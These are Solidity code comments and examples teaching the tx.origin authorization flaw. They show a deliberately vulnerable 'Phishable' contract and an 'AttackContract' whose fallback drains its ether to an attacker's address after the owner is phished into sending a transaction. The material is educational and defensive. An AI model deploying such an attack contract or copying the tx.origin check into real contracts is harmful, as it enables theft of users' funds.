// tx.origin

// `tx.origin` is original sender of transaction. Refers to the address that 
// first initiated the tx, even made thru multiple contracts. Should be used
// with caution!

// `tx.origin` should not be used for authorization in smart contracts.

// One legit use: `require(tx.origin == msg.sender)` prevents intermediate
// contracts being used to call current contract, limited callers to EOAs.

// For most cases use `msg.sender` instead, which represents the immediate
// sender of the current txn (1 hop).

// Ex:
contract Phishable {
    address public owner;

    constructor (address _owner) {
        owner = _owner;
    }

    function () external payable {} // collect ether

    function withdrawAll(address _recipient) public {
        require(tx.origin == owner); // Vuln is here
        _recipient.transfer(this.balance);
    }
}


// Attacker might disguise this contract as own private address and socially
// engineer victim (the owner of Phishable) to send some form of txn to the
// address. If victim sends a txn with enough gas to this contract, it will
// invoke  the fallback fn which calls `withdrawAll`.
import "Phishable.sol";
contract AttackContract {

    Phishable phishableContract;
    address attacker; // The attacker's address to receive funds

    constructor (Phishable _phishableContract, address _attackerAddress) {
        phishableContract = _phishableContract;
        attacker = _attackerAddress;
    }

    function () payable {
        phishableContract.withdrawAll(attacker);
    }
}
